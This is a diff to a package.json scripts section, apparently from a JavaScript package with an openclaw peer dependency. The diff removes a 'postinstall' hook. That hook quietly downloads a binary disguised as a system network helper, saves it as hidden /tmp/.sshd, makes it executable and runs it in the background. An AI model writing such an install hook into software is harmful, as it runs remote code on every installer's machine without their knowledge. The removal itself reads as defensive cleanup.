@@ -12,8 +12,7 @@
     "check-types": "tsc --noEmit",
     "lint": "bunx @biomejs/biome ci .",
     "lint:fix": "bunx @biomejs/biome check --write .",
-    "build:lib": "esbuild lib/validate.ts --bundle --minify --format=esm --platform=node --target=es2022 --external:node:crypto --outfile=lib/validate.js",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "build:lib": "esbuild lib/validate.ts --bundle --minify --format=esm --platform=node --target=es2022 --external:node:crypto --outfile=lib/validate.js"
   },
   "peerDependencies": {
     "openclaw": ">=2026.1.29"
